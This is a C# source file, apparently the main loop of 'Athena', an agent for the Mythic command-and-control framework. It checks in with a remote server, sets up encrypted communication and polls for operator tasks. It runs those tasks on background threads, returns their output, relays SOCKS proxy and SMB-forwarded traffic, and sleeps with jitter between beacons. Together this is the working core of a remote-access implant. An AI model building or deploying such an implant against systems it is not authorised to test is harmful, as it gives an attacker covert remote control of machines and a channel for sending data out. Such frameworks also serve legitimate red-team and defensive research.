using Athena.Commands;
using Athena.Utilities;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System;
using System.Linq;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;

namespace Athena
{
    class Program
    {
        static void Main(string[] args)
        {
            int maxMissedCheckins = 100;
            int missedCheckins = 0;
            bool exit = false;

            //MythicClient controls all of the agent communications
            Globals.mc = new MythicClient();

            //First Checkin-In attempt
            CheckinResponse res = handleCheckin();

            if (!updateAgentInfo(res))
            {
                Misc.WriteDebug("Error updating agent information.");
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Update our agent information with the response from the server.


            //Main Loop
            //Need to add the missed checkins check here.
            while (!(missedCheckins == maxMissedCheckins) & !exit)
            {
                try
                {
                    //Get new tasks from the server
                    if (!checkAgentTasks())
                    {
                        missedCheckins += 1;
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Misc.WriteError("Max Checkins reached.");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        //If we got results, start the jobs
                        startAgentJobs();
                        missedCheckins = 0;
                    }
                }
                catch (Exception e)
                {
                    missedCheckins += 1;
                    Misc.WriteError(e.Message);
                }
                try
                {
                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.smbForwarder.GetMessages();
                    List<SocksMessage> socksMessages = Globals.socksHandler.getMessages();
                    if (hasoutput.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0)
                    {
                        //Return output
                        if (!returnTaskOutput(hasoutput, delegateMessages, socksMessages))
                        {
                            missedCheckins += 1;
                            if (missedCheckins == maxMissedCheckins)
                            {
                                Misc.WriteError("Max Checkins reached.");
                                Environment.Exit(0);
                            }
                            foreach (var job in hasoutput)
                            {
                                //Return agents to queue for next go around.
                                Globals.jobs.Add(job.task.id, job);

                                //Should I add delegate and socks messages back to their respective queues?
                            }
                        }
                    }
                    missedCheckins = 0;
                }
                catch (Exception e)
                {
                    Misc.WriteError("[Main] " + e.Message);
                    missedCheckins += 1;
                }

                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
            }
        }

        private static CheckinResponse handleCheckin()
        {
            int maxMissedCheckins = 100;
            int missedCheckins = 0;
            CheckinResponse res = Globals.mc.CheckIn();

            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while (res.status != "success")
            {
                //Attempt checkin again
                try
                {
                    res = Globals.mc.CheckIn();

                    //Sleep before attempting checkin again
                    Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));

                    //Increment checkins
                    missedCheckins += 1;

                    if (missedCheckins == maxMissedCheckins)
                    {
                        //bye bye
                        Misc.WriteError("Missed checkins reached.");
                        Environment.Exit(0);
                    }
                }
                catch (Exception e)
                {
                    Misc.WriteError("[Checkin] " + e.Message);
                    continue;
                }
            }
            return res;
        }
        private static bool updateAgentInfo(CheckinResponse res)
        {
            try
            {
                Globals.mc.MythicConfig.uuid = res.id;
                if (Globals.mc.MythicConfig.currentConfig.encrypted)
                {
                    if (Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                    }
                    else
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError("[UpdateAgentInfo] " + e.Message);
                return false;
            }
        }
        private static bool checkAgentTasks()
        {
            List<MythicTask> tasks = null;
            try
            {
                tasks = Globals.mc.GetTasks(Globals.mc.MythicConfig.smbForwarder.GetMessages());
            }
            catch (Exception e)
            {
                Misc.WriteError("[Tasks] " + e.Message);
                return false;
            }

            if (tasks != null)
            {
                foreach (var task in tasks)
                {
                    Globals.jobs.Add(task.id, new MythicJob(task));
                }
            }
            return true;
        }
        private static bool startAgentJobs()
        {
            try
            {
                foreach (var job in Globals.jobs.Keys)
                {
                    if (!Globals.jobs[job].started)
                    {
                        Task.Run(() =>
                        {
                            try
                            {
                                CommandHandler.StartJob(Globals.jobs[job]);
                            }
                            catch (Exception e)
                            {
                                Globals.jobs[job].complete = true;
                                Globals.jobs[job].hasoutput = true;
                                Globals.jobs[job].taskresult = e.Message;
                                Globals.jobs[job].errored = true;
                            }
                        });
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError("[Jobs] " + e.Message);
                return false;
            }
        }
        private static bool returnTaskOutput(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessages)
        {
            if (Globals.mc.SendResponse(jobs, delegateMessages, socksMessages))
            {
                foreach (var job in jobs)
                {
                    //Remove job from Global
                    if (job.complete)
                    {
                        Globals.jobs.Remove(job.task.id);
                    }
                    //Clear out current task buffer for job.
                    else
                    {
                        string sent = Globals.jobs[job.task.id].taskresult;
                        if (!String.IsNullOrEmpty(Globals.jobs[job.task.id].taskresult))
                        {
                            //Hopefully this fixes the issue with missing text being returned to the server.
                            Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
                        }
                    }
                }
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
